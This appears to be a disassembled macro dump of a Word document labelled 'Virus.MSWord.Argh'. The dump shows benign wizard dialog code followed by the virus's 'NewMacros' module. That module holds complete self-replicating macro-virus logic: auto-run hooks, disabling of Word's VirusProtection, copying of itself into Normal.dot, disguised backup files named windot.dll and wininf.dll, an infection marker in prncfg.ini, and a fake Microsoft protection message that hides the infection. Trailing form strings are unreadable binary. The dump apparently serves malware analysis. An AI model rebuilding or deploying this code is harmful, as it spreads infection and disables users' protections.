' 	LitDI2 0x002C 
' 	LitDI2 0x0000 
' 	Ld kInsertAddress$ 
' 	Ld WordBasic 
' 	ArgsMemLd CommandValid 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' Line #1450:
' 	EndIfBlock 
' Line #1451:
' 	ArgsCall EnableControls 0x0000 
' Line #1452:
' 	EndSub 
' 	QuoteRem 0x0008 0x000B "ChangeState"
' Line #1453:
' Line #1454:
' 	QuoteRem 0x0000 0x0027 "%%%% Wizard Dialog Control Function %%%"
' Line #1455:
' 	FuncDefn (Private Function DlgControl(id, iaction, wvalue))
' Line #1456:
' 	Dim 
' 	VarDefn fRet
' Line #1457:
' 	Dim 
' 	VarDefn idnum
' Line #1458:
' 	Dim 
' 	VarDefn result
' Line #1459:
' 	LitDI2 0x0001 
' 	St fRet 
' Line #1460:
' 	Ld iaction 
' 	SelectCase 
' Line #1461:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0010 0x0004 "Init"
' Line #1462:
' 	LitDI2 0x0001 
' 	St State 
' Line #1463:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0001 
' 	QuoteRem 0x0023 0x000E "Hide OK button"
' Line #1464:
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0001 
' 	QuoteRem 0x0023 0x001B "Hide Hint button (no hints)"
' Line #1465:
' 	ArgsCall RstDialog 0x0000 
' 	QuoteRem 0x0018 0x0017 "restore dialog settings"
' Line #1466:
' 	LitDI2 0x0000 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	Ld LastState 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall SHControls 0x0003 
' 	QuoteRem 0x0047 0x000F "Hide ALL states"
' Line #1467:
' 	Ld State 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	Ld State 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	LitDI2 0x0001 
' 	ArgsCall SHControls 0x0003 
' 	QuoteRem 0x004B 0x0012 "Show initial state"
' Line #1468:
' 	Ld State 
' 	ArgsLd HideFilePreview__ 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0001 
' 	EndIf 
' Line #1469:
' 	ArgsCall EnableControls 0x0000 
' 	QuoteRem 0x001B 0x0017 "Enable/Disable controls"
' Line #1470:
' 	LitDI2 0x0006 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' 	QuoteRem 0x0021 0x0005 "Next>"
' Line #1471:
' 	LitDI2 0x0000 
' 	St fRet 
' Line #1472:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0010 0x0005 "Click"
' Line #1473:
' 	Ld id$ 
' 	Ld WordBasic 
' 	ArgsMemLd DlgControlId 0x0001 
' 	St idnum 
' Line #1474:
' 	Ld id$ 
' 	Ld idnum 
' 	ArgsLd DoButtonClick 0x0002 
' 	St result 
' Line #1475:
' 	Ld result 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #1476:
' 	Ld idnum 
' 	SelectCase 
' Line #1477:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0017 0x0006 "Cancel"
' Line #1478:
' 	LitDI2 0x0000 
' 	St fRet 
' 	QuoteRem 0x001D 0x000B "exit dialog"
' Line #1479:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0017 0x0005 "<Back"
' Line #1480:
' 	Ld State 
' 	Ld State 
' 	ArgsLd PrevState 0x0001 
' 	ArgsCall ChangeState 0x0002 
' Line #1481:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0017 0x0005 "Next>"
' Line #1482:
' 	Ld State 
' 	Ld State 
' 	ArgsLd NextState 0x0001 
' 	ArgsCall ChangeState 0x0002 
' Line #1483:
' 	LitDI2 0x002B 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0018 0x0016 "Address Book To DAPFEL"
' Line #1484:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall SetAddress 0x0001 
' Line #1485:
' 	LitDI2 0x0028 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' Line #1486:
' 	LitDI2 0x002C 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0018 0x001A "Address Book Return DAPFEL"
' Line #1487:
' 	LitDI2 0x0002 
' 	Paren 
' 	ArgsCall SetAddress 0x0001 
' Line #1488:
' 	LitDI2 0x002A 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' Line #1489:
' 	CaseElse 
' Line #1490:
' 	QuoteRem 0x0014 0x0010 "not gunna happen"
' Line #1491:
' 	EndSelect 
' Line #1492:
' 	Ld result 
' 	LitDI2 0x0001 
' 	Eq 
' 	ElseIfBlock 
' Line #1493:
' 	ArgsCall SaveDialog 0x0000 
' 	QuoteRem 0x001B 0x000D "save settings"
' Line #1494:
' 	LitDI2 0x0000 
' 	St fRet 
' Line #1495:
' 	EndIfBlock 
' Line #1496:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0015 "Item contents changed"
' Line #1497:
' 	QuoteRem 0x000C 0x000B " do nothing"
' Line #1498:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0012 "item focus changed"
' Line #1499:
' 	Ld id$ 
' 	Ld wvalue 
' 	ArgsCall ItemFocusChanged 0x0002 
' Line #1500:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0004 "idle"
' Line #1501:
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' 	QuoteRem 0x0028 0x0010 "clear status bar"
' Line #1502:
' 	Ld WordBasic 
' 	ArgsMemLd Window 0x0000 
' 	Ld iEmptyDoc 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld iWorkDoc 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' 	EndIf 
' 	QuoteRem 0x0053 0x0013 "bring work to front"
' Line #1503:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0021 "updated forced (by moving dialog)"
' Line #1504:
' 	Ld iEmptyDoc 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' 	QuoteRem 0x0030 0x0022 "bring the empty window to the fore"
' Line #1505:
' 	CaseElse 
' Line #1506:
' 	EndSelect 
' Line #1507:
' 	Ld fRet 
' 	St DlgControl 
' Line #1508:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000A "DlgControl"
' Line #1509:
' Line #1510:
' 	FuncDefn (Private Function StrWizardPath() As String)
' Line #1511:
' 	Dim 
' 	VarDefn strPath (As String)
' Line #1512:
' 	Dim 
' 	VarDefn strFileName (As String)
' Line #1513:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #1514:
' 	Dim 
' 	VarDefn fFound (As Boolean)
' Line #1515:
' Line #1516:
' 	OnError FatalError 
' Line #1517:
' Line #1518:
' 	LitVarSpecial (True)
' 	St fFound 
' Line #1519:
' 	Ld objWizTemplate 
' 	MemLd path 
' 	St strPath 
' Line #1520:
' Line #1521:
' 	Ld strPath 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #1522:
' 	QuoteRem 0x0008 0x001D " New template based on Wizard"
' Line #1523:
' 	QuoteRem 0x0008 0x003C " Get location of templates - first look in UserTemplatesPath"
' Line #1524:
' 	QuoteRem 0x0008 0x001B " and then in Workgroup path"
' Line #1525:
' 	LitDI2 0x0000 
' 	St i 
' Line #1526:
' 	LitVarSpecial (False)
' 	St fFound 
' Line #1527:
' 	Ld wdUserTemplatesPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St strPath 
' Line #1528:
' Line #1529:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Lt 
' 	Paren 
' 	Ld fFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Paren 
' 	While 
' Line #1530:
' 	Ld strPath 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #1531:
' 	QuoteRem 0x0010 0x002C " First try to find wizard with long filename"
' Line #1532:
' 	Ld strPath 
' 	ParamNamed SearchPath 
' 	Ld kWizname$ 
' 	Ld strWIZ 
' 	Concat 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed SubDir 
' 	LitDI2 0x0000 
' 	ParamNamed MatchCase 
' 	Ld WordBasic 
' 	ArgsMemCall FileFind 0x0004 
' Line #1533:
' 	Ld WordBasic 
' 	ArgsMemLd CountFoundFiles 0x0000 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #1534:
' 	QuoteRem 0x0014 0x0027 " Try to find wizard with short filename"
' Line #1535:
' 	Ld strPath 
' 	ParamNamed SearchPath 
' 	Ld strWizShortName 
' 	Ld strWIZ 
' 	Concat 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed SubDir 
' 	LitDI2 0x0000 
' 	ParamNamed MatchCase 
' 	Ld WordBasic 
' 	ArgsMemCall FileFind 0x0004 
' Line #1536:
' 	Ld WordBasic 
' 	ArgsMemLd CountFoundFiles 0x0000 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St fFound 
' 	EndIf 
' Line #1537:
' 	ElseBlock 
' Line #1538:
' 	LitVarSpecial (True)
' 	St fFound 
' Line #1539:
' 	EndIfBlock 
' Line #1540:
' 	EndIfBlock 
' Line #1541:
' Line #1542:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #1543:
' 	Ld wdWorkgroupTemplatesPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St strPath 
' Line #1544:
' 	Wend 
' Line #1545:
' Line #1546:
' 	Ld fFound 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001F " Wizard was found, so save path"
' Line #1547:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [FoundFileName$] 0x0001 
' 	St strFileName 
' Line #1548:
' 	Ld strFileName 
' 	LitDI2 0x0005 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St strPath 
' Line #1549:
' 	EndIfBlock 
' Line #1550:
' 	EndIfBlock 
' Line #1551:
' Line #1552:
' 	Ld fFound 
' 	Paren 
' 	IfBlock 
' Line #1553:
' 	Ld Application 
' 	MemLd PathSeparator 
' 	St strPathSeparator 
' Line #1554:
' 	Ld strPath 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	Ld strPathSeparator 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld strPath 
' 	Ld strPathSeparator 
' 	Concat 
' 	St strPath 
' 	EndIf 
' Line #1555:
' 	Ld strPath 
' 	St StrWizardPath 
' Line #1556:
' 	ExitFunc 
' Line #1557:
' 	EndIfBlock 
' Line #1558:
' Line #1559:
' 	Label LWizardMissing 
' Line #1560:
' 	Ld strERR_WIZ_NOT_FOUND 
' 	ArgsCall MsgBox 0x0001 
' Line #1561:
' Line #1562:
' 	Label FatalError 
' Line #1563:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1564:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000E " StrWizardPath"
' Line #1565:
' Line #1566:
' Line #1567:
' 	QuoteRem 0x0000 0x0042 "main error reporting routine called for fatal errors in the wizard"
' Line #1568:
' 	QuoteRem 0x0000 0x002B "SHOULD NOT BE CALLED FOR POST-WIZARD ERRORS"
' Line #1569:
' 	FuncDefn (Public Sub ReportError(ByVal ErrorCode As ))
' Line #1570:
' 	Dim 
' 	VarDefn lErrorCode (As Long)
' Line #1571:
' 	Dim 
' 	VarDefn strErrorMsg (As String)
' Line #1572:
' Line #1573:
' 	Ld ErrorCode 
' 	MemLd Number 
' 	St lErrorCode 
' Line #1574:
' 	Ld ErrorCode 
' 	MemLd Description 
' 	St strErrorMsg 
' Line #1575:
' Line #1576:
' 	QuoteRem 0x0004 0x0037 "The next statement seems to reset the ErrorCode object,"
' Line #1577:
' 	QuoteRem 0x0004 0x0022 "even though it is a ByVal argument"
' Line #1578:
' 	OnError (Resume Next) 
' Line #1579:
' Line #1580:
' 	LitVarSpecial (True)
' 	Paren 
' 	ArgsCall ResetWizardEnvironment 0x0001 
' Line #1581:
' Line #1582:
' 	Ld fBalloonVisible 
' 	If 
' 	BoSImplicit 
' 	Ld objAssistantBalloon 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #1583:
' 	Ld lErrorCode 
' 	If 
' 	BoSImplicit 
' 	Ld strErrorMsg 
' 	ArgsCall DisplayErrorMsg 0x0001 
' 	EndIf 
' Line #1584:
' 	Ld lAssistantId 
' 	If 
' 	BoSImplicit 
' 	Ld lAssistantId 
' 	LitVarSpecial (False)
' 	Ld Assistant 
' 	ArgsMemCall EndWizard 0x0002 
' 	EndIf 
' 	QuoteRem 0x0041 0x0019 "2nd parameter is fSuccess"
' Line #1585:
' Line #1586:
' 	Ld formWizard 
' 	LitNothing 
' 	Is 
' 	Paren 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #1587:
' 	Ld formWizard 
' 	ArgsMemCall Hide 0x0000 
' Line #1588:
' 	Ld formWizard 
' 	ArgsCall Unlock 0x0001 
' Line #1589:
' 	SetStmt 
' 	LitNothing 
' 	Set formWizard 
' Line #1590:
' 	EndIfBlock 
' Line #1591:
' Line #1592:
' 	QuoteRem 0x0004 0x0037 "ReportError is not called in post-wizard option errors."
' Line #1593:
' 	QuoteRem 0x0004 0x001B "So, always closing the doc."
' Line #1594:
' 	Ld wdDoNotSaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' 	QuoteRem 0x002C 0x0020 "ActiveDocument assumed to be set"
' Line #1595:
' Line #1596:
' 	QuoteRem 0x0004 0x0014 "terminate the wizard"
' Line #1597:
' 	End 
' Line #1598:
' Line #1599:
' 	EndSub 
' 	QuoteRem 0x0008 0x000C " ReportError"
' Line #1600:
' Macros/VBA/NewMacros - 9471 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub infect(m))
' Line #2:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #3:
' 	Ld Assistant 
' 	MemLd Animation 
' 	St d 
' Line #4:
' 	Ld msoAnimationGetTechy 
' 	Ld Assistant 
' 	MemSt Animation 
' Line #5:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall getnormal 0x0001 
' Line #6:
' 	Ld d 
' 	Ld Assistant 
' 	MemSt Animation 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Sub deletenormal(m))
' Line #10:
' 	OnError e 
' Line #11:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	LitStr 0x000C "oldNewMacros"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #12:
' 	Label e 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub copymacro(m))
' Line #15:
' 	OnError eco 
' Line #16:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 11 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #17:
' 	Label eco 
' Line #18:
' 	EndSub 
' Line #19:
' Line #20:
' 	FuncDefn (Sub replicate(m))
' Line #21:
' 	LitDI2 0x0032 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0019 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set a 
' Line #23:
' 	LitStr 0x0007 "Help me"
' 	Ld a 
' 	MemSt Heading 
' Line #24:
' 	LitStr 0x0027 "I'm not feeling very vell .. AAARGHH!!!"
' 	Ld a 
' 	MemSt Then 
' Line #25:
' 	Ld a 
' 	ArgsMemCall Show 0x0000 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	OnError re 
' Line #28:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #29:
' 	LitStr 0x000A "Normal.dot"
' 	MemStWith AttachedTemplate 
' Line #30:
' 	EndWith 
' Line #31:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	Label re 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub AutoNew())
' Line #35:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall infect 0x0001 
' Line #36:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall replicate 0x0001 
' Line #37:
' 	LitStr 0x0007 "AutoNew"
' 	Paren 
' 	ArgsCall runmacro 0x0001 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub AutoClose())
' Line #40:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall infect 0x0001 
' Line #41:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall replicate 0x0001 
' Line #42:
' 	LitStr 0x0009 "AutoClose"
' 	Paren 
' 	ArgsCall runmacro 0x0001 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub autoopen())
' Line #45:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall infect 0x0001 
' Line #46:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall replicate 0x0001 
' Line #47:
' 	LitStr 0x0008 "autoopen"
' 	Paren 
' 	ArgsCall runmacro 0x0001 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub AutoExit())
' Line #50:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall infect 0x0001 
' Line #51:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall replicate 0x0001 
' Line #52:
' 	LitStr 0x0008 "AutoExit"
' 	Paren 
' 	ArgsCall runmacro 0x0001 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub ToolsMacro())
' Line #55:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitStr 0x0067 "Microsoft is protecting your normal.dot from virus infection You can only add macros to other documents"
' 	Ld vbOKOnly 
' 	ArgsLd MsgBox 0x0002 
' 	St n 
' Line #57:
' 	ExitSub 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall getnormal 0x0001 
' Line #60:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall restoreoriginal 0x0001 
' Line #61:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall recopy 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Sub restoreoriginal(m))
' Line #67:
' 	OnError rr1 
' 	BoS 0x0000 
' Line #68:
' 	LineCont 0x0008 05 00 08 00 0B 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #69:
' 	Label rr1 
' Line #70:
' 	OnError rro 
' 	BoS 0x0000 
' Line #71:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x000C "oldNewMacros"
' 	ParamNamed New 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #72:
' 	Label rro 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub recopy(m))
' Line #75:
' 	OnError eco 
' Line #76:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall reren 0x0001 
' Line #77:
' 	LineCont 0x000C 05 00 08 00 14 00 08 00 1A 00 08 00
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Add 
' 	LitStr 0x000A "wininf.dll"
' 	Add 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #78:
' 	Label eco 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub reren(m))
' Line #81:
' 	OnError rre 
' Line #82:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	LitStr 0x000C "oldNewMacros"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #83:
' 	Label rre 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub getnormal(m))
' Line #86:
' 	LitStr 0x000A "prncfg.ini"
' 	LitStr 0x000C "Printer Port"
' 	LitStr 0x000A "PortNumber"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St virusflag 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #88:
' 	Ld virusflag 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #89:
' 	LitStr 0x0003 "340"
' 	LitStr 0x000A "prncfg.ini"
' 	LitStr 0x000C "Printer Port"
' 	LitStr 0x000A "PortNumber"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #90:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' 	QuoteRem 0x0042 0x001D "save normal.dot to windot.dll"
' Line #91:
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Add 
' 	LitStr 0x000A "windot.dll"
' 	Add 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #92:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #93:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall deletenormal 0x0001 
' Line #94:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall copymacro 0x0001 
' Line #95:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #96:
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Add 
' 	LitStr 0x000A "wininf.dll"
' 	Add 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	QuoteRem 0x0075 0x0011 "save infected dot"
' Line #97:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub runmacro(m))
' Line #101:
' 	OnError rme 
' Line #102:
' 	LitStr 0x0014 "Normal.oldNewMacros."
' 	Ld m 
' 	Add 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #103:
' 	Label rme 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub stealth())
' Line #106:
' 	ArgsCall ToolsMacro 0x0000 
' Line #107:
' 	LitStr 0x0007 "stealth"
' 	ArgsCall MsgBox 0x0001 
' Line #108:
' 	End 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' Line #112:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�N.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�mg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͑�e	�eQ.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�{�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_AQ1��`�P�N�S͑�e	�eQ��R!hck
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�P�N0	c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��R!hck
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��vX[0R 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�e�e�N-N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0x��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0͑�e	�eQ0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�O�_ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�N�e�N-N	�eQ��R!hck
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnBackup'" IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnClose'" IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnRestore'" IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Argh' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
